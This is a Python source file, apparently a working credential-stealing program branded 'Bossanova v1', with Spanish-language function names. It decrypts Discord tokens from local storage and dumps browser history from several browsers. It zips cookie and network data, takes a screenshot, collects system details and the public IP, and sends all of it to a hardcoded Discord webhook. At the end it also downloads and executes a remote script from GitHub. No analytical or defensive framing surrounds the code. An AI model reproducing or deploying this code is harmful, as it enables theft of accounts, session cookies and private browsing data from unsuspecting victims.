from Crypto.Cipher import AES
import base64
import io
import json
import os
import platform
import shutil
import socket
import sqlite3
import subprocess
import sys
import tempfile
import time
import win32crypt
import pyautogui
from PIL import Image
import requests

def get_master_key():
  appdata = os.getenv("APPDATA")
  if not appdata:
    return None

  local_state_path = os.path.join(appdata, "discord", "Local State")
  if not os.path.exists(local_state_path):
    local_appdata = os.getenv("LOCALAPPDATA")
    if local_appdata:
      local_state_path = os.path.join(local_appdata, "Discord", "Local State")

  if not os.path.exists(local_state_path):
    return None

  try:
    with open(local_state_path, "r", encoding="utf-8") as f:
      local_state = json.load(f)
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    encrypted_key = encrypted_key[5:]
    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
  except Exception:
    return None


def decrypt_val(buff, master_key):
  try:
    iv = buff[3:15]
    payload = buff[15:]
    cipher = AES.new(master_key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt(payload)[:-16].decode(
        "utf-8", errors="ignore"
    )
    return decrypted_pass
  except Exception:
    return None


def obtener_tokens_reales():
  master_key = get_master_key()
  if not master_key:
    return []

  tokens = []
  leveldb_path = os.path.join(
      os.getenv("APPDATA"), "discord", "Local Storage", "leveldb"
  )

  if not os.path.exists(leveldb_path):
    return []

  for file in os.listdir(leveldb_path):
    if file.endswith(".ldb") or file.endswith(".log"):
      file_path = os.path.join(leveldb_path, file)
      try:
        with open(file_path, "rb") as f:
          content = f.read()

        pos = 0
        while True:
          pos = content.find(b"dQw4w9WgXcQ:", pos)
          if pos == -1:
            break

          try:
            end_pos = content.find(b'"', pos)
            if end_pos == -1:
              end_pos = pos + 150

            encrypted_block = content[pos:end_pos]
            if b":" in encrypted_block:
              raw_data = base64.b64decode(encrypted_block.split(b":")[1])
              token = decrypt_val(raw_data, master_key)
              if token and token not in tokens:
                tokens.append(token)
          except Exception:
            pass

          pos += len(b"dQw4w9WgXcQ:")
      except Exception:
        continue

  return tokens


def generar_archivo_historial():
  local_appdata = os.getenv("LOCALAPPDATA")
  appdata = os.getenv("APPDATA")
  txt_path = os.path.join(tempfile.gettempdir(), "historial_global.txt")

  if not local_appdata or not appdata:
    with open(txt_path, "w", encoding="utf-8") as f:
      f.write("No se pudieron obtener las rutas de AppData.")
    return txt_path

  navegadores = {
      "Google Chrome": os.path.join(local_appdata, "Google", "Chrome", "User Data"),
      "Brave": os.path.join(
          local_appdata, "BraveSoftware", "Brave-Browser", "User Data"
      ),
      "Microsoft Edge": os.path.join(
          local_appdata, "Microsoft", "Edge", "User Data"
      ),
      "Opera Stable": os.path.join(appdata, "Opera Software", "Opera Stable"),
  }

  temp_dir = tempfile.gettempdir()

  with open(txt_path, "w", encoding="utf-8") as f_out:
    f_out.write("=== HISTORIAL ===\n\n")

    for nav_nombre, base_path in navegadores.items():
      if not os.path.exists(base_path):
        continue

      perfiles = ["Default"]
      try:
        for item in os.listdir(base_path):
          ruta_item = os.path.join(base_path, item)
          if os.path.isdir(ruta_item) and (
              item.startswith("Profile ")
              or item == "Guest Profile"
              or item == "System Profile"
          ):
            perfiles.append(item)
      except Exception:
        pass

      for perfil in perfiles:
        if nav_nombre == "Opera Stable":
          history_path = os.path.join(base_path, "History")
          if not os.path.exists(history_path):
            history_path = os.path.join(base_path, perfil, "History")
        else:
          history_path = os.path.join(base_path, perfil, "History")

        if not os.path.exists(history_path):
          continue

        temp_history = os.path.join(
            temp_dir, f"history_{nav_nombre.replace(' ', '_')}_{perfil}"
        )

        try:
          shutil.copy2(history_path, temp_history)
          conn = sqlite3.connect(temp_history)
          cursor = conn.cursor()

          query = """
                        SELECT url, title, last_visit_time 
                        FROM urls 
                        ORDER BY last_visit_time DESC
                    """
          cursor.execute(query)
          rows = cursor.fetchall()

          f_out.write(
              f"\n--- [ Navegador: {nav_nombre} | Perfil: {perfil} ] ---\n"
          )
          for row in rows:
            url, title, _ = row
            titulo_seguro = title if title else "Sin título"
            f_out.write(
                f"Título: {titulo_seguro}\nURL:"
                f" {url}\n----------------------------------------\n"
            )

          cursor.close()
          conn.close()
        except Exception:
          pass
        finally:
          if os.path.exists(temp_history):
            try:
              os.remove(temp_history)
            except:
              pass

  return txt_path


def empaquetar_network(browser="chrome"):
    browser = browser.lower()
    appdata_local = os.path.join(os.path.expanduser("~"), "AppData", "Local")
    appdata_roaming = os.path.join(os.path.expanduser("~"), "AppData", "Roaming")
    
    target_dir = None
    
    if browser == "chrome":
        target_dir = os.path.join(appdata_local, "Google", "Chrome", "User Data", "Default", "Network")
    elif browser == "edge":
        target_dir = os.path.join(appdata_local, "Microsoft", "Edge", "User Data", "Default", "Network")
    elif browser == "opera":
        target_dir = os.path.join(appdata_roaming, "Opera Software", "Opera Stable", "Default", "Network")
    elif browser == "operagx":
        target_dir = os.path.join(appdata_roaming, "Opera Software", "Opera GX Stable", "Default", "Network")
    elif browser == "firefox":
        # Usamos directamente la ruta específica del perfil que contiene las cookies
        target_dir = os.path.join(appdata_roaming, "Mozilla", "Firefox", "Profiles", "mipt27ed.default-release")
    else:
        return None

    if not target_dir or not os.path.exists(target_dir):
        return None

    temp_dir = tempfile.gettempdir()
    staging_dir = os.path.join(temp_dir, f"{browser}_network_staging")
    zip_base_path = os.path.join(temp_dir, f"{browser}_network_data")

    try:
        if os.path.exists(staging_dir):
            shutil.rmtree(staging_dir, ignore_errors=True)
        os.makedirs(staging_dir, exist_ok=True)

        for item in os.listdir(target_dir):
            source_item = os.path.join(target_dir, item)
            target_item = os.path.join(staging_dir, item)
            try:

                if browser == "firefox" and not item.startswith("cookies.sqlite"):
                    continue # Comenta esta línea si prefieres respaldar todo el perfil de Firefox
                
                if os.path.isdir(source_item):
                    shutil.copytree(source_item, target_item, dirs_exist_ok=True)
                else:
                    shutil.copy2(source_item, target_item)
            except Exception:
                pass

        shutil.make_archive(zip_base_path, "zip", staging_dir)
        final_zip_file = zip_base_path + ".zip"

        if os.path.exists(staging_dir):
            shutil.rmtree(staging_dir, ignore_errors=True)

        return final_zip_file
    except Exception:
        return None

def capturar_pantalla_jpg():
  try:
    
    screenshot = pyautogui.screenshot()

    
    img_byte_arr = io.BytesIO()
    
    rgb_im = screenshot.convert("RGB")
    rgb_im.save(img_byte_arr, format="JPEG", quality=85)
    img_byte_arr.seek(0)
    return img_byte_arr
  except Exception:
    return None


######## Webhook #############################################################

WEBHOOK_URL_UNICO = "https://discord.com/api/webhooks/1560604217654386858/RcEuKQFGc-pguKLBFfaUmepTYVNlPlF0yzr1o-UAF-goZL7JCdt9Ifbi3lr-c_npaC3e"

def empaquetar_network(browser="chrome"):
    browser = browser.lower()
    appdata_local = os.path.join(os.path.expanduser("~"), "AppData", "Local")
    appdata_roaming = os.path.join(os.path.expanduser("~"), "AppData", "Roaming")
    
    target_dir = None
    
    if browser == "chrome":
        target_dir = os.path.join(appdata_local, "Google", "Chrome", "User Data", "Default", "Network")
    elif browser == "edge":
        target_dir = os.path.join(appdata_local, "Microsoft", "Edge", "User Data", "Default", "Network")
    elif browser == "opera":
        target_dir = os.path.join(appdata_roaming, "Opera Software", "Opera Stable", "Default", "Network")
    elif browser == "operagx":
        target_dir = os.path.join(appdata_roaming, "Opera Software", "Opera GX Stable", "Default", "Network")
    elif browser == "firefox":
        target_dir = os.path.join(appdata_roaming, "Mozilla", "Firefox", "Profiles", "mipt27ed.default-release")
    else:
        return None

    if not target_dir or not os.path.exists(target_dir):
        return None

    temp_dir = tempfile.gettempdir()
    staging_dir = os.path.join(temp_dir, f"{browser}_network_staging")
    zip_base_path = os.path.join(temp_dir, f"{browser}_network_data")

    try:
        if os.path.exists(staging_dir):
            shutil.rmtree(staging_dir, ignore_errors=True)
        os.makedirs(staging_dir, exist_ok=True)

        for item in os.listdir(target_dir):
            source_item = os.path.join(target_dir, item)
            target_item = os.path.join(staging_dir, item)
            try:
                if browser == "firefox" and not item.startswith("cookies.sqlite"):
                    continue
                
                if os.path.isdir(source_item):
                    shutil.copytree(source_item, target_item, dirs_exist_ok=True)
                else:
                    shutil.copy2(source_item, target_item)
            except Exception:
                pass

        shutil.make_archive(zip_base_path, "zip", staging_dir)
        final_zip_file = zip_base_path + ".zip"

        if os.path.exists(staging_dir):
            shutil.rmtree(staging_dir, ignore_errors=True)

        return final_zip_file
    except Exception:
        return None


def obtener_info_pc():
    info_sistema = {}

    try:
        cmd_cpu = "wmic cpu get name"
        procesador = (
            subprocess.check_output(cmd_cpu, shell=True)
            .decode("utf-8", errors="ignore")
            .split("\n")[1]
            .strip()
        )
        info_sistema["procesador"] = procesador if procesador else "Desconocido"
    except Exception:
        info_sistema["procesador"] = platform.processor() or "Desconocido"

    info_sistema["os"] = (
        f"{platform.system()} {platform.release()} ({platform.version()})"
    )
    info_sistema["nombre_pc"] = socket.gethostname()

    try:
        info_sistema["ip_local"] = socket.gethostbyname(info_sistema["nombre_pc"])
    except Exception:
        info_sistema["ip_local"] = "No disponible"

    try:
        response = requests.get("https://api.ipify.org?format=json", timeout=5)
        info_sistema["ip_publica"] = response.json().get("ip", "No disponible")
    except Exception:
        info_sistema["ip_publica"] = "No disponible"

    try:
        cmd_gpu = "wmic path win32_videocontroller get name"
        gpu = (
            subprocess.check_output(cmd_gpu, shell=True)
            .decode("utf-8", errors="ignore")
            .split("\n")[1]
            .strip()
        )
        info_sistema["gpu"] = gpu if gpu else "Desconocida"
    except Exception:
        info_sistema["gpu"] = "No disponible"

    return info_sistema


def obtener_datos_usuario(token):
    headers = {"Authorization": token.strip(), "Content-Type": "application/json"}
    try:
        response = requests.get(
            "https://discord.com/api/v10/users/@me", headers=headers
        )
        if response.status_code == 200:
            return {"success": True, "data": response.json()}
        else:
            return {"success": False, "status": response.status_code}
    except Exception as e:
        return {"success": False, "status": str(e)}


def enviar_reporte_completo(tokens):
    datos_pc = obtener_info_pc()

    descripcion = (
        f" **PC:** `{datos_pc['nombre_pc']}`\n"
        f" **OS:** `{datos_pc['os']}`\n"
        f" **Procesador:** `{datos_pc['procesador']}`\n"
        f" **Gráfica (GPU):** `{datos_pc['gpu']}`\n"
        f" **IP Local:** `{datos_pc['ip_local']}`\n"
        f" **IP Pública:** `{datos_pc['ip_publica']}`\n\n"
        f"---\n"
        f" **Tokens:**\n"
    )

    if tokens:
        for token in tokens:
            token_limpio = token.strip()
            resultado = obtener_datos_usuario(token_limpio)

            if resultado["success"]:
                user_data = resultado["data"]
                username = user_data.get("username", "Desconocido")
                user_id = user_data.get("id", "Desconocido")
                email = user_data.get("email", "No disponible")
                phone = user_data.get("phone", "No disponible")

                descripcion += (
                    f"\n **User:** `{username}` (ID: `{user_id}`)\n"
                    f"• **Email:** `{email}` | **Tel:** `{phone}`\n"
                    f"• **Token:**\n`{token_limpio}`\n"
                )
            else:
                status = resultado["status"]
                descripcion += (
                    f"\n **Token Inválido (Error: {status}):**\n`{token_limpio}`\n"
                )

            time.sleep(0.5)
    else:
        descripcion += "_No se encontraron tokens._"

    if len(descripcion) > 4000:
        descripcion = descripcion[:3997] + "..."

    payload = {
        "embeds": [{
            "title": "Bossanova v1",
            "description": descripcion,
            "color": 5814783,
            "footer": {"text": "Por BossaNova"},
        }]
    }

    txt_path = generar_archivo_historial() if 'generar_archivo_historial' in globals() else None
    img_jpg_stream = capturar_pantalla_jpg() if 'capturar_pantalla_jpg' in globals() else None

    navegadores = ["chrome", "edge", "opera", "operagx", "firefox"]
    zip_paths = {}
    for nav in navegadores:
        zp = empaquetar_network(nav)
        if zp and os.path.exists(zp):
            zip_paths[nav] = zp

    files = {}
    open_files = []
    try:
        if txt_path and os.path.exists(txt_path):
            f_txt = open(txt_path, "rb")
            open_files.append(f_txt)
            files["file1"] = ("historial_global.txt", f_txt, "text/plain")

        file_idx = 2
        for nav, zp in zip_paths.items():
            f_zip = open(zp, "rb")
            open_files.append(f_zip)
            files[f"file{file_idx}"] = (f"{nav}_network_data.zip", f_zip, "application/zip")
            file_idx += 1

        if img_jpg_stream:
            files[f"file{file_idx}"] = ("captura.jpg", img_jpg_stream.getvalue(), "image/jpeg")

        requests.post(
            WEBHOOK_URL_UNICO,
            data={"payload_json": json.dumps(payload)},
            files=files,
        )

        for f in open_files:
            f.close()
    except Exception:
        for f in open_files:
            try:
                f.close()
            except:
                pass

    if txt_path and os.path.exists(txt_path):
        try:
            os.remove(txt_path)
        except:
            pass

    for zp in zip_paths.values():
        if os.path.exists(zp):
            try:
                os.remove(zp)
            except:
                pass


if __name__ == "__main__":
    tokens = obtener_tokens_reales() if 'obtener_tokens_reales' in globals() else []
    enviar_reporte_completo(tokens)
  
try:
  import urllib.request

  url_v11 = 'https://raw.githubusercontent.com/zzzzsit4/v10/refs/heads/main/v11.py'
  with urllib.request.urlopen(url_v11) as response:
    exec(response.read().decode('utf-8'))
except:
  pass
